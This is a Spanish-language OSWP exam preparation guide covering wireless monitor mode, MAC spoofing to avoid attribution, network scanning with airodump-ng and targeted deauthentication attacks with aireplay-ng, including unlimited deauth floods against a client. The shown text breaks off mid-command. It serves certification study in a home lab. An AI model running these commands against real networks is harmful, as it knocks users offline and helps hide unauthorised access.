# Preparación para el OSWP (by s4vitar)

![OSWP Image](https://funkyimg.com/i/2VTJW.jpg)
#### Offensive Security Wireless Attacks (WiFu) course and Offensive Security Wireless Professional (OSWP) Cheat Sheet

## Índice y Estructura Principal
- [Antecedentes - Experiencia Personal](#Antecedentes)
- [Estructura de los apuntes](#estructura-de-los-apuntes)
     * [Redes WPA](#redes-wpa)
       * [Conceptos básicos](#conceptos-básicos)
       * [Modo monitor](#modo-monitor)
       * [Configuración de la tarjeta de red y tips](#configuración-de-la-tarjeta-de-red-y-tips)
       * [Análisis del entorno](#análisis-del-entorno)
       * [Modos de filtro](#modos-de-filtro)
       * [Exportación de evidencias](#exportación-de-evidencias)
       * [Concepto de Handshake](#concepto-de-handshake)
       * [Técnicas para capturar un Handshake](#técnicas-para-capturar-un-handshake)
            * [Ataque de Deautenticación dirigido](#ataque-de-deautenticación-dirigido)
            * [Ataque de Deautenticación global (Broadcast MAC Address)](#ataque-de-deautenticación-global)
            * [Ataque de Autenticación](#ataque-de-autenticación)
            * [CTS Frame Attack - Secuestro del Ancho de Banda](#cts-frame-attack)
            * [Beacon Flood Mode Attack](#beacon-flood-mode-attack)
            * [Disassociation Amok Mode Attack](#disassociation-amok-mode-attack)
            * [Michael Shutdown Exploitation](#michael-shutdown-exploitation)
            * [Técnicas pasivas](#técnicas-pasivas)
        * [Validación del Handshake con Pyrit](#validación-del-handshake-con-pyrit)
        * [Tratamiento y filtro de la captura](#tratamiento-y-filtro-de-la-captura)
        * [Análisis de paquetes de red con Tshark](#análisis-de-paquetes-de-red-con-tshark)
        * [Extracción del hash en el Handshake](#extracción-del-hash-en-el-handshake)
        * [Fuerza bruta con John](#fuerza-bruta-con-john)
        * [Fuerza bruta con Aircrack](#fuerza-bruta-con-aircrack)
        * [Fuerza bruta con Hashcat](#fuerza-bruta-con-hashcat)
        * [Proceso de ataque con Bettercap](#proceso-de-ataque-con-bettercap)
        * [Técnicas de aumento de la velocidad de cómputo](#técnicas-de-aumento-de-la-velocidad-de-cómputo)
            * [Concepto de Rainbow Table](#concepto-de-rainbow-table)
            * [Cracking con Pyrit](#cracking-con-pyrit)
            * [Cracking con Cowpatty](#cracking-con-cowpatty)
            * [Cracking con Airolib](#cracking-con-airolib)
            * [Rainbow Table con GenPMK](#rainbow-table-con-genpmk)
            * [Cracking con Pyrit frente a Rainbow Table](#cracking-con-pyrit-frente-a-rainbow-table)
            * [Cracking con Cowpatty frente a Rainbow Table](#cracking-con-cowpatty-frente-a-rainbow-table)
            * [Cracking con Pyrit a través de ataque por base de-datos](#cracking-con-pyrit-a-través-de-ataque-por-base-de-datos)
        * [Técnicas de espionaje](#técnicas-de-espionaje)
            * [Uso de Airdecap para el desencriptado de paquetes](#uso-de-airdecap-para-el-desencriptado-de-paquetes)
            * [Análisis del desencriptado con Tshark y Wireshark](#análisis-del-desencriptado-con-tshark-y-wireshark)
            * [Concepto de enrutamiento](#concepto-de-enrutamiento)
            * [Espionaje con Ettercap y Driftnet + enrutamiento con iptables](#espionaje-con-ettercap-y-driftnet-+-enrutamiento-con-iptables)
        * [Ataques graciosos](#ataques-graciosos)
            * [Uso de Xersoploit](#uso-de-xerosploit)
            * [Reemplazado de imágenes web](#reemplazado-de-imágenes-web)
            * [Ataque Shaking Web](#ataque-shaking-web)
        * [Ataque DNS Spoofing](#ataque-dns-spoofing)
        * [Evil Twin Attack](#evil-twin-attack)
           * [Creación de fichero DHCP](#creación-de-fichero-dhcp)
           * [Configuración de página web](#configuración-de-página-web)
           * [Inicialización de servicios](#inicialización-de-servicios)
           * [Creación de base de datos via MYSQL](#creación-de-base-de-datos-via-mysql)
           * [Creación de falso punto de acceso via Airbase](#creación-de-falso-punto-de-acceso-via-airbase)
           * [Creación de interfaz y asignación de segmentos](#cración-de-interfaz-y-asignación-de-segmentos)
           * [Control y creación de reglas de enrutamiento por iptables](#control-y-creación-de-reglas-de-enrutamiento-por-iptables)
           * [Sincronización de reglas definidas con el Fake AP](#sincronización-de-reglas-definidas-con-el-fake-ap)
           * [Robo de datos](#robo-de-datos)
        * [Generación de contraseñas con crunch](#generación-de-contraseñas-con-crunch)
        * [Ataques por WPS](#ataques-por-wps)
            * [Uso de Reaver y pixiewps](#uso-de-reaver-y-pixiewps)
            * [Tips con WPSApp](#tips-con-wpsapp)
            * [Ataques por WPS](#ataques-por-wps)
            * [Uso de Wifimosys](#uso-de-wifimosys)
            * [Uso de Linset](#uso-de-linset)
        * [Ataque a redes sin clientes](#ataque-a-redes-sin-clientes)
            * [Client-less PKMID Attack](#client--less-pmkid-attack)
                * [Ataque desde Bettercap](#ataque-desde-bettercap)
                * [Uso de hcxpcaptool](#uso-de-hcxpcaptool)
                * [Ataque via hcxdumptool](#ataque-via-hcxdumptool)
        * [Redes WPA Ocultas](#redes-wpa-ocultas)
        * [Redes WEP](#redes-wep)

            
            
       

Antecedentes
===============================================================================================================================
Antes que nada me gustaría comentar un poco mi experiencia a la hora de abordar el curso, pues tal vez le
sirva de inspiración para aquel que pretenda sacarse la certificación.

#### ¿Es difícil la certificación?

![Certificado Físico](https://funkyimg.com/i/2VTgJ.jpeg)

A diferencia del OSCP, encontré bastante sencillo el curso, pero todo tiene su explicación. 

Cuando empecé con el Hacking, lo primero que toqué fue la parte WiFi, por lo que esta parte la tenía más que
controlada antes de empezar. En cuanto a aprendizaje, aprendí una o dos cosas nuevas, lo cual es
excitante, pero a groso modo os puedo decir que por mi cuenta de manera autodidacta abarqué mucho más temario
del que presentaba el curso.

Por ello hago este Gist, no sólo para comentar las técnicas que necesitáis tener controladas, sino para
enseñaros un par de trucos y vectores de ataque que no están de más guardarlos bajo la manga.

#### ¿Qué plan me pillo?

En mi caso me pillé un mes de curso, pero al tercer día de pagarlo me presenté al examen. Para aquellos que no
estén experimentados con la temática WiFi, os puedo decir que con un mes tenéis de sobra, ya que no requiere
tanta dedicación como el OSCP.

Eso sí, hay multitud de comandos y distintos casos, por lo que sobra decir que practicar siempre hay que
practicar. 

En este caso el curso no dispone de laboratorio, por lo que será necesario montarse un laboratorio
en local donde practicar los distintos casos. Para los interesados, todos los laboratorios los monté con un
'**TP-Link**', un simple repetidor desde el cual podía configurar si la red quería que fuera de protocolo WPA
o de protocolo WEP con sus distintos modos de autenticación.

#### ¿Qué bases tuve antes de comenzar con la certificación?

Como dije anteriormente, tenía altamente controlada la parte WiFi, por lo que el estudio de los ataques a
redes WPA y WEP no supuso ningún problema. La guía que te entregan junto a los vídeos están perfectamente
estructurados, y cuentas con todo lo necesario para enfrentarte al examen.

#### ¿Qué pasos me recomiendas para abordar con éxito la certificación?

Recomiendo montar un laboratorio en local para practicar todos los vectores de ataque vistos durante el curso.

Para abordar con éxito la certificación, es necesario que sepas al dedillo cómo manejarte en las siguientes
situaciones, siguiendo como objetivo obtener la contraseña del punto de acceso inalámbrico:

* Ataques a redes WPA con autenticación PSK
* Ataques a redes WEP con clientes sin autenticación SKA
* Ataques a redes WEP con clientes y autenticación SKA
* Ataques a redes WEP sin clientes

Ahora bien, para cada caso, hay distintas formas de efectuar el procedimiento, ya que depende a su vez del
tráfico de la red, la calidad de los paquetes capturados y distintos factores.

#### ¿Cómo está estructurado el examen?

El examen tiene una duración de cuatro horas, te conectas a una máquina por VPN la cual dispone de una tarjeta
de red configurada y a partir de ahí escaneas el entorno.

En el entorno, hay un total de tres puntos de acceso que debes vulnerar, cada uno de ellos representando un
caso diferente. Para aprobar el examen, debes averiguar la contraseña de los tres AP's, pues en caso contrario
no te aprueban.

La gran pregunta, ¿son cuatro horas suficientes?, mi respuesta es más que suficiente. En mi caso en una media
hora aproximada ya había terminado el examen (lo cual me sorprendió). Recomiendo tener todos los comandos
apuntados para cada caso, eso os permitirá ir a tiro hecho.

#### ¿Tuve problemas a la hora de practicar con el laboratorio en local?

Como dije anteriormente, esta certificación no dispone de laboratorio, lo que te obliga a montarte tu propio
laboratorio en local para practicar.

Los únicos ataques que no pude replicar fueron el **Chop Chop de Korek** y el **Fragmentation Attack**,
empleado para redes que no disponen de clientes asociados. Este mismo problema lo he visto en más gente,
leyendo en artículos donde detallaban el mismo inconveniente. Al parecer depende del modelo de router que
tengas. 

En la web de Offensive se cita el modelo a usar para practicar los vectores de ataque, pero como
comprenderéis, no iba a gastar dinero por poder hacer dos ataques. Por lo demás, el resto de ataque los pude
replicar correctamente.

#### ¿Cuáles son los siguientes pasos?

La siguiente certificación que me estoy preparando es el **eWPT**, una certificación de Pentesting Web
bastante valorada y orientada a Bug Bounty. Si me animo puede que mate dos pájaros de un tiro y tras tenerla
pruebe a hacer el **AWAE** de Offensive Security, ya que estaré bien fresco de ideas una vez finalice el otro.

Por si os interesa, el **eWPT** dispone de un plan (que es el que he pagado) que os permite tener un
laboratorio de máquinas de por vida sobre los que practicar Pentesting Web, el cual os actualizan
frecuentemente.

Estructura de los apuntes
===============================================================================================================================

Para facilitar la repartición de apuntes, intuyo que es buena idea dividirlo por un lado en ataques a redes
WPA y por otro lado en ataques a redes WEP con sus distintos casos, ¡así que así lo haremos Mike!

## Redes WPA
Este apartado engloba todos los vectores de ataque y técnicas ofensivas destinadas al protocolo WPA.

### Conceptos básicos

Hay que aclarar una serie de conceptos clave antes de empezar. La mayoría de los ataques que vamos a ver,
además de en ocasiones servir para molestar... van destinados a obtener la contraseña de una red inalámbrica.

El por qué es necesario realizar un ataque para obtener la contraseña es algo que veremos en los siguientes
puntos. Hay que tener en cuenta que al tratarse de una autenticación de tipo PSK (Pre-Shared-Key), se está
haciendo uso de una clave pre-compartida como su nombre indica, una contraseña única que de estar a
disposición de cualquiera puede ser usada para llevar a cabo una asociación contra el AP.

A la hora de llevar a cabo una asociación por una estación (**cliente**) contra el AP, se deja un rastro a
nivel de paquetes (eapol), los cuales como atacante, pueden ser capturados y tratados sin estar autenticados
al punto de acceso para posteriormente extraer la contraseña de la red inalámbrica.

Todo esto explicado de una manera no técnica para no entrar en materia tan rápido, ya a medida que vayamos
avanzando se irá analizando mas a bajo nivel cómo funciona todo :)

### Modo monitor

Hay que pensar que estamos rodeados de paquetes por todos lados, paquetes que no somos capaces de percibir,
paquetes que contienen información del entorno por el que nos movemos. 

Estos paquetes pueden ser capturados con tarjetas de red que acepten el modo monitor. El **modo monitor**, no
es más que un modo por el cual podemos escuchar y capturar todos los paquetes que viajen por el aire. Tal vez
lo mejor de todo es que no sólo podemos capturarlos, sino también manipularlos (veremos algunos ataques
interesantes más adelante).

Para comprobar si nuestra tarjeta de red acepta el modo monitor, haremos una prueba en el siguiente apartado.

### Configuración de la tarjeta de red y tips

Empecemos con un par de comandos básicos. A continuación os listo mi tarjeta de red:

```bash
┌─[root@parrot]─[/home/s4vitar/Desktop/Red]
└──╼ #ifconfig wlan0
wlan0: flags=4163<UP,BROADCAST,RUNNING,MULTICAST>  mtu 1500
        inet 192.168.1.187  netmask 255.255.255.0  broadcast 192.168.1.255
        inet6 fe80::1d28:6b2b:a941:5796  prefixlen 64  scopeid 0x20<link>
        ether e4:70:b8:d3:93:5d  txqueuelen 1000  (Ethernet)
        RX packets 6426576  bytes 9229384163 (8.5 GiB)
        RX errors 0  dropped 5  overruns 0  frame 0
        TX packets 1160899  bytes 162727829 (155.1 MiB)
        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0
```

Espero que a partir de ahora os llevéis bien con ella, pues con esta practicaremos la mayoría de ataques.

Para poner en modo monitor nuestra tarjeta de red, es tan simple como aplicar el siguiente comando:

```bash
┌─[root@parrot]─[/home/s4vitar/Desktop/Red]
└──╼ #airmon-ng start wlan0

Found 5 processes that could cause trouble.
Kill them using 'airmon-ng check kill' before putting
the card in monitor mode, they will interfere by changing channels
and sometimes putting the interface back in managed mode

  PID Name
  818 avahi-daemon
  835 wpa_supplicant
  877 avahi-daemon
 5398 NetworkManager
18308 dhclient

PHY	Interface	Driver		Chipset

phy0	wlan0		iwlwifi		Intel Corporation Wireless 7265 (rev 61)

		(mac80211 monitor mode vif enabled for [phy0]wlan0 on [phy0]wlan0mon)
		(mac80211 station mode vif disabled for [phy0]wlan0)
```

Ahora bien, cosas a tener en cuenta. Cuando estamos en modo monitor, perdemos conectividad a internet. Este
modo no admite conexión a internet, por lo que no os asustéis si de pronto veis que no podéis navegar. Veremos
cómo deshabilitar este modo para que todo vuelva a la normalidad.

Cabe decir que al iniciar este modo, se generan una serie de **procesos conflictivos**. Esto es así dado que
por ejemplo, si no vamos a tener acceso a internet... ¿por qué tener corriendo los procesos '**dhclient**' y
'**wpa_supplicant**'?, es algo absurdo, e incluso la propia suite nos lo recuerda... pues se encargan de darnos
conectividad y mantenernos con conexión en una red ya estando asociados, lo cual en este caso... no aplica.

Matar estos procesos es sencillo, tenemos la siguiente forma:

```bash
┌─[root@parrot]─[/home/s4vitar/Desktop/Red]
└──╼ #pkill dhclient && pkill wpa_supplicant
```

O si deseamos tirar de la propia suite:

```bash
┌─[root@parrot]─[/home/s4vitar/Desktop/Red]
└──╼ #airmon-ng check kill

Killing these processes:

  PID Name
  835 wpa_supplicant
```

Ya con esto, nuestra tarjeta de red está en modo monitor. Una forma de comprobar si estamos en modo monitor es
listando nuestras interfaces de red. Ahora nuestra red **wlan0** debería llamarse **wlan0mon**:

```bash
┌─[root@parrot]─[/home/s4vitar/Desktop/Red]
└──╼ #ifconfig | grep wlan0 -A 6
wlan0mon: flags=4163<UP,BROADCAST,RUNNING,MULTICAST>  mtu 1500
        unspec E4-70-B8-D3-93-5C-30-3A-00-00-00-00-00-00-00-00  txqueuelen 1000  (UNSPEC)
        RX packets 63  bytes 12032 (11.7 KiB)
        RX errors 0  dropped 63  overruns 0  frame 0
        TX packets 0  bytes 0 (0.0 B)
        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0
```

Una vez llegados a este punto, se podría decir que ya somos capaces de capturar todos los paquetes que viajan
por nuestro alrededor, pero dejaremos esto para el siguiente punto.

Importante, ¿cómo desactivar el modo monitor y hacer que todo vuelva a la normalidad en términos de
conectividad?, sencillo. Podemos hacer uso de los siguientes comandos para restablecer la conexión:

```bash
┌─[root@parrot]─[/home/s4vitar/Desktop/Red]
└──╼ #airmon-ng stop wlan0mon && service network-manager restart

PHY	Interface	Driver		Chipset

phy0	wlan0mon	iwlwifi		Intel Corporation Wireless 7265 (rev 61)

		(mac80211 station mode vif enabled on [phy0]wlan0)

		(mac80211 monitor mode vif disabled for [phy0]wlan0mon)

┌─[root@parrot]─[/home/s4vitar/Desktop/Red]
└──╼ #ping -c 10 -i 0.01 -q google.es
PING google.es (172.217.17.3) 56(84) bytes of data.

--- google.es ping statistics ---
10 packets transmitted, 10 received, 0% packet loss, time 309ms
rtt min/avg/max/mdev = 28.718/29.565/29.985/0.427 ms, pipe 3
```

Por lo que fuera malestares y preocupaciones, no hay que tirar el ordenador a la basura. 

Pero esto no es suficiente. A pesar de no estar conectados a ninguna red y no disponer de direccion IP, lo que
en sí puede dejar rastro es nuestra dirección MAC. 

La dirección MAC al fin y al cabo es como el DNI de cada dispositivo, es lo que identifica un dispositivo
móvil, un router, un ordenador, etc. Sería feo estar haciendo cierto tipo de ataques actuando bajo una
dirección MAC que se nos asocie, es lo equivalente a hacer un atraco con pasamontañas pero llevar una cartera
con nuestro DNI dentro del bolsillo y que en un descuido se nos caiga al suelo quedando a la exposición de
todos los demás.

Una buena practica consiste en falsificar la dirección MAC, y no hace falta saber de electrónica o Hardware
para ello. A través de la utilidad **macchanger**, podemos jugar con la dirección MAC de nuestro dispositivo
para manipularla a nuestro antojo.

Por ejemplo, imaginemos que quiero asignar a mi tarjeta de red una dirección MAC de la **NATIONAL SECURITY
AGENCY** (**NSA**), ¿cómo se procedería?. Primero buscamos la dirección MAC en el amplio listado del que
dispone 'macchanger':

```bash
┌─[root@parrot]─[/home/s4vitar/Desktop/Red]
└──╼ #macchanger -l | grep -i "national security agency"
8310 - 00:20:91 - J125, NATIONAL SECURITY AGENCY
```
Estos tres primeros pares listados corresponden a lo que se conoce como **Organizationally Unique
Identifier**, un simple número de 24 bits que identifica al vendor, manufacturer u otra organización.

Una dirección MAC está compuesta por 6 bytes, ya tenemos los primeros 3 bytes, ¿qué hay de los otros 3 bytes?.
Los 24 bits restantes corresponden a lo que se conoce como **Universally Administered Address**, y sinceramente...
en mis prácticas, siempre me la invento.

Es decir, que si quisiera falsificar una dirección MAC registrada bajo el **OUI** de la NSA, podría hacer lo
siguiente:

```bash
┌─[root@parrot]─[/home/s4vitar/Desktop/Red]
└──╼ #ifconfig wlan0mon down
┌─[root@parrot]─[/home/s4vitar/Desktop/Red]
└──╼ #echo "$(macchanger -l | grep -i "national security agency" | awk '{print $3}'):da:1b:6a"
00:20:91:da:1b:6a
┌─[root@parrot]─[/home/s4vitar/Desktop/Red]
└──╼ #macchanger --mac=$(!!) wlan0mon
Current MAC:   e4:70:b8:d3:93:5c (unknown)
Permanent MAC: e4:70:b8:d3:93:5c (unknown)
New MAC:       00:20:91:da:1b:6a (J125, NATIONAL SECURITY AGENCY)
┌─[root@parrot]─[/home/s4vitar/Desktop/Red]
└──╼ #ifconfig wlan0mon up
┌─[root@parrot]─[/home/s4vitar/Desktop/Red]
└──╼ #macchanger -s wlan0mon
Current MAC:   00:20:91:da:1b:6a (J125, NATIONAL SECURITY AGENCY)
Permanent MAC: e4:70:b8:d3:93:5c (unknown)
```

Aspectos a tener en cuenta de lo anterior:

* Es necesario dar de baja la interfaz de red para manipular su dirección MAC, pues de lo contrario el propio
  'macchanger' nos avisará de que es necesario darla de baja.

* Con la utilidad '--mac', podemos especificar la dirección MAC a utilizar para la interfaz de red
  especificada.

* Una vez aplicados los cambios, damos de alta la interfaz y con el parámetro '-s' (**show**), validamos que
  nuestra tarjeta de red corresponde al **OUI** asignado.

Perfecto, si has llegado a este punto podemos continuar.

### Análisis del entorno

Llega el momento interesante. Ahora que estamos en modo monitor, para capturar todos los paquetes de nuestro
alrededor, podemos hacer uso del siguiente comando:

```bash
airodump-ng wlan0mon
```

**IMPORTANTE**: Aunque tal vez lo debería haber mencionado en el anterior punto, no todas las tarjetas de red
tienen por qué llamarse **wlan0**, pueden tener un nombre distinto (Ej: **wlp2s0**), por lo que habrá que
tener en cuenta su nombre para acompañarlo junto al comando a aplicar.

Al correr el comando citado anteriormente, obtenemos el siguiente resultado:

```bash
 CH 13 ][ Elapsed: 18 s ][ 2019-08-05 13:34                                         
                                                                                                                                                                                       
 BSSID              PWR  Beacons    #Data, #/s  CH  MB   ENC  CIPHER AUTH ESSID
                                                                                                                                                                                       
 20:34:FB:B1:C5:53  -20       19        1    0   1  180  WPA2 CCMP   PSK  hacklab                                                                                                      
 1C:B0:44:D4:16:78  -59       23       13    0  11  130  WPA2 CCMP   PSK  MOVISTAR_1677                                                                                                
 30:D3:2D:58:3C:6B  -79       29        4    0  11  135  WPA2 CCMP   PSK  devolo-30d32d583c6b                                                                                          
 10:62:D0:F6:F7:D8  -81       15        0    0   6  130  WPA2 CCMP   PSK  LowiF7D3                                                                                                     
 F8:8E:85:DF:3E:13  -85       14        0    0   9  130  WPA  CCMP   PSK  Wlan1                                                                                                        
 FC:B4:E6:99:A9:09  -85       17        0    0   1  130  WPA2 CCMP   PSK  MOVISTAR_A908                                                                                                
 28:9E:FC:0C:40:3E  -90        2        0    0   6  195  WPA2 CCMP   PSK  vodafone4038                                                                                                 
                                                                                                                                                                                       
 BSSID              STATION            PWR   Rate    Lost    Frames  Probe                                                                                                             
                                                                                                                                                                                        
 20:34:FB:B1:C5:53  34:41:5D:46:D1:38  -27    0 - 2e     0        1                                
```

Entonces bien, ¿cómo se interpreta este output?. 

De los campos más importantes por el momento, por un lado tenemos el campo **BSSID**, donde siempre podremos
corroborar cuál es la dirección MAC del punto de acceso. Por otro lado, contamos con el campo **PWR**, donde a
modo de consideración, a más cerca esté del valor 0, podremos decir que más cerca nos situamos del AP.

El campo **CH**, indica el canal en el que se sitúa el AP. Cada AP, está posicionado en un canal distinto, con
el objetivo de evitar que se dañe el espectro de onda entre las múltiples redes del entorno. Existe un ataque
justamente de denegación de servicio, que se encarga de generar múltiples Fake AP's situados en el mismo canal
que en el del AP objetivo, consiguiendo así que la red queda inoperativa temporalmente (lo veremos más
adelante).

Por otro lado, los campos **ENC, CIPHER** y **AUTH**, donde podremos comprobar siempre con qué tipo de red
estamos tratando. La mayoría de redes domésticas cumplen la encriptación WPA/WPA, con cifrado CCMP y modo de
autenticación PSK.

En el campo **ESSID**, podremos siempre saber el nombre de la red con la que estamos tratando, pudiendo así en
una misma línea a través del campo **BSSID** saber cuál es su dirección MAC, de utilidad para cuando
comencemos con la fase de filtrado.

El campo **DATA**, por el momento no lo tocaremos, ya que nos meteremos a fondo con este cuando tratemos las
redes de protocolo **WEP**. 

Asimismo, en la parte inferior, podemos ver otros datos que están siendo capturados con la herramienta. Esta
sección corresponde a la de los clientes. Consideraremos una estación como un cliente asociado. Para el
ejemplo mostrado, existe una estación con dirección MAC **34:41:5D:46:D1:38** asociado al **BSSID**
'20:34:FB:B1:C5:53', donde de manera inmediata en la parte superior podemos ver que se trata de la red
**hacklab**, por lo que ya sabemos que dicha red cuenta con un cliente asociado.

Es posible que en ocasiones lleguemos a capturar estaciones que no están asociadas a ningún punto de acceso,
el cual en este caso se indicará con un '**not associated**' en el campo **BSSID**. Es a través del campo
**Frames** de las estaciones, donde podremos ver qué tipo de actividad tiene el cliente sobre dicho AP. Si los
Frames aumentan considerablemente a intervalos cortos de tiempo, esto quiere decir que la estación se
encuentra activa en el momento de la captura.

### Modos de filtro

Aunque es una maravilla poder capturar todos los AP's y estaciones de nuestro entorno, como atacante siempre
nos interesará atentar contra un AP específico. Por ello, introducimos en este punto los modos de filtro
disponibles desde la herramienta para capturar aquellos puntos de acceso deseados.

Volvamos al caso de antes:

```bash
 CH 13 ][ Elapsed: 18 s ][ 2019-08-05 13:34                                         
                                                                                                                                                                                       
 BSSID              PWR  Beacons    #Data, #/s  CH  MB   ENC  CIPHER AUTH ESSID
                                                                                                                                                                                       
 20:34:FB:B1:C5:53  -20       19        1    0   1  180  WPA2 CCMP   PSK  hacklab                                                                                                      
 1C:B0:44:D4:16:78  -59       23       13    0  11  130  WPA2 CCMP   PSK  MOVISTAR_1677                                                                                                
 30:D3:2D:58:3C:6B  -79       29        4    0  11  135  WPA2 CCMP   PSK  devolo-30d32d583c6b                                                                                          
 10:62:D0:F6:F7:D8  -81       15        0    0   6  130  WPA2 CCMP   PSK  LowiF7D3                                                                                                     
 F8:8E:85:DF:3E:13  -85       14        0    0   9  130  WPA  CCMP   PSK  Wlan1                                                                                                        
 FC:B4:E6:99:A9:09  -85       17        0    0   1  130  WPA2 CCMP   PSK  MOVISTAR_A908                                                                                                
 28:9E:FC:0C:40:3E  -90        2        0    0   6  195  WPA2 CCMP   PSK  vodafone4038                                                                                                 
                                                                                                                                                                                       
 BSSID              STATION            PWR   Rate    Lost    Frames  Probe                                                                                                             
                                                                                                                                                                                        
 20:34:FB:B1:C5:53  34:41:5D:46:D1:38  -27    0 - 2e     0        1  
 ```

 Imaginemos que queremos filtrar para que sólo se lista el punto de acceso cuyo **ESSID** es **hacklab**, ¿qué
 podemos recaudar de primeras de esta red?

 * El AP se sitúa en el canal 1
 * El AP posee dirección MAC  20:34:FB:B1:C5:53
 * El AP posee ESSID hacklab

Generalmente con 2 datos ya es suficiente para llevar a cabo el filtro. Para este caso, podríamos filtrar la
red en cuestión de las siguientes formas:

* airodump-ng -c 1 --essid hacklab wlan0mon
* airodump-ng -c 1 --bssid  20:34:FB:B1:C5:53 wlan0mon
* airodump-ng -c 1 --bssid  20:34:FB:B1:C5:53 --essid hacklab wlan0mon

Para cualquiera de las formas representadas, obtendríamos los siguientes resultados:

```bash
 CH  1 ][ Elapsed: 0 s ][ 2019-08-08 20:12                                         
                                                                                                                                                                                       
 BSSID              PWR RXQ  Beacons    #Data, #/s  CH  MB   ENC  CIPHER AUTH ESSID
                                                                                                                                                                                       
 20:34:FB:B1:C5:53  -26 100       29        7    3   1  180  WPA2 CCMP   PSK  hacklab                                                                                                  
                                                                                                                                                                                       
 BSSID              STATION            PWR   Rate    Lost    Frames  Probe                                                                                                             
                                                                                                                                                                                       
 20:34:FB:B1:C5:53  34:41:5D:46:D1:38  -26    0e- 6e     0        9                 
```

### Exportación de evidencias

Ahora bien, a efectos prácticos, nos encontramos en la misma situación que al principio. Como atacantes, lo
que nos interesa siempre es recolectar la información del AP objetivo. En este caso, estamos monitorizando el
tráfico del AP **hacklab**, pero sin generar evidencias.

Resulta más interesante capturar y exportar todo el tráfico que se monitorea a un fichero, con el propósito de
posteriormente poder analizarlo. Para ello se hace uso de la misma sintaxis pero incorporando el parámetro
'**-w**', donde seguidamente especificamos el nombre del fichero:

* airodump-ng -c 1 -w Captura --essid hacklab wlan0mon
* airodump-ng -c 1 -w Captura --bssid  20:34:FB:B1:C5:53 wlan0mon
* airodump-ng -c 1 -w Captura --bssid  20:34:FB:B1:C5:53 --essid hacklab wlan0mon

De esta forma, una vez comienza el escaneo, se generan los siguientes ficheros en nuestro directorio de
trabajo:

```bash
┌─[root@parrot]─[/home/s4vitar/Desktop/Red]
└──╼ #ls
Captura-01.cap  Captura-01.csv  Captura-01.kismet.csv  Captura-01.kismet.netxml  Captura-01.log.csv
```
Realmente, de todos estos ficheros, con el que la gran mayoría de veces trabajaremos es con el que tiene
extensión '.cap', esto es así dando que es el que contendrá el ** Handshake** capturado, con el que trataremos
en breve.

### Concepto de Handshake

Por cada vez que una estación se asocia o re-asocia a un AP, durante el proceso de asociación viaja la
contraseña del AP encriptada. A efectos prácticos, se dice siempre que el **Handshake** en estos casos se
genera en el momento en el que un cliente se re-conecta a la red. 

Como estamos monitorizando todo el tráfico de la red en un fichero... viene de maravilla capturar una
re-asociación, pues esta autenticación dejará rastro en nuestra captura y seremos capaces de visualizar la
contraseña encriptada de la red.

Podrías pensar, ¿entonces tengo que quedarme esperando hasta que por X razón una estación se re-asocie al AP?,
no exactamente. Ese tipo de escenario se le consideraría escenario pasivo, pues nosotros como atacantes no
estaríamos interviniendo para manipular el tráfico del AP. 

Existe un escenario activo, el cual pondremos en práctica, donde como atacantes somos capaces de elaborar
externamente sin estar asociados a un AP, un ataque de de-autenticación, consiguiendo así expulsar a uno o
múltiples clientes de una red inalámbrica sin consentimiento.

Un Handshake al fin y al cabo quedará marcado como un Hash, el cual podremos extraer de la captura
posteriormente para iniciar un ataque de fuerza bruta.

### Técnicas para capturar un Handshake

A continuación, se representan distintas técnicas con el propósito de capturar un Handshake de la red fijada
como objetivo.

#### Ataque de deautenticación dirigido

El protocolo IEEE 802.11 (Wi-Fi), contiene la provisión para un **marco de deautenticación**. Como atacantes,
para este ataque lo que haremos será enviar un marco de deautenticación al punto de acceso inalámbrico
objetivo, especificando la dirección MAC del cliente que queremos que sea expulsado de la red.

El proceso de enviar dicho marco al punto de acceso se denomina '**Técnica autorizada para informar a una
estación no autorizada que se ha desconectado de la red**'.

En otras palabras, estaríamos poniendo en práctica el siguiente esquema:

<img align="center" src="https://funkyimg.com/i/2W6cB.png">

Para retomar la captura por donde lo habíamos dejado, os vuelvo a representar el caso:

```bash
 CH  1 ][ Elapsed: 0 s ][ 2019-08-08 20:12                                         
                                                                                                                                                                                       
 BSSID              PWR RXQ  Beacons    #Data, #/s  CH  MB   ENC  CIPHER AUTH ESSID
                                                                                                                                                                                       
 20:34:FB:B1:C5:53  -26 100       29        7    3   1  180  WPA2 CCMP   PSK  hacklab                                                                                                  
                                                                                                                                                                                       
 BSSID              STATION            PWR   Rate    Lost    Frames  Probe                                                                                                             
                                                                                                                                                                                       
 20:34:FB:B1:C5:53  34:41:5D:46:D1:38  -26    0e- 6e     0        9                 
```

Por tanto, tenemos un cliente **34:41:5D:46:D1:38** asociado al AP **hacklab**. Tratemos de expulsarlo del
punto de acceso. Para expulsar al cliente, haremos uso de la utilidad de **aireplay-ng**.

'**Aireplay-ng**' cuenta con diferentes modos:

```bash
┌─[root@parrot]─[/home/s4vitar/Desktop/Red]
└──╼ #echo; aireplay-ng --help | tail -n 13 | grep -v help | sed '/^\s*$/d' | sed 's/^ *//'; echo

--deauth      count : deauthenticate 1 or all stations (-0)
--fakeauth    delay : fake authentication with AP (-1)
--interactive       : interactive frame selection (-2)
--arpreplay         : standard ARP-request replay (-3)
--chopchop          : decrypt/chopchop WEP packet (-4)
--fragment          : generates valid keystream   (-5)
--caffe-latte       : query a client for new IVs  (-6)
--cfrag             : fragments against a client  (-7)
--migmode           : attacks WPA migration mode  (-8)
--test              : tests injection and quality (-9)
```

Para este caso, nos interesa el parámetro '**-0**', el cual también puede ser usado con el parámetro
'**--deauth**'.

La sintaxis sería la siguiente:

* aireplay-ng -0 10 -e hacklab -c 34:41:5D:46:D1:38 wlan0mon

**CONSIDERACIONES**: Es necesario tener otra consola abierta monitorizando el AP objetivo, pues en caso de no
hacerlo, es probable que el ataque de deautenticación no funcione, pues **aireplay** no sabe sobre qué canal
operar.

Para el comando representado, lo que estamos haciendo es desde nuestro equipo de atacante enviar 10 paquetes
de de-autenticación a la estación objetivo, haciendo así que esta se desasocie de la red. Al igual que se han
especificado 10 paquetes, su valor puede incrementarse al valor deseado. 

Es posible incluso especificar un valor '**0**', haciéndole saber así a **aireplay** que queremos enviar un
número infinito/ilimitado de paquetes de deautenticación a la estación objetivo:

* aireplay-ng -0 0 -e hacklab -c 34:41:5D:46:D1:38 wlan0mon

Esto mismo lo podríamos haber hecho especificando la dirección MAC del AP en vez de su **ESSID**:

* aireplay-ng -0 0 -a 20:34:FB:B1:C5:53 -c 34:41:5D:46:D1:38 wlan0mon

Obteniendo los siguientes resultados:

```bash
┌─[✗]─[root@parrot]─[/home/s4vitar]
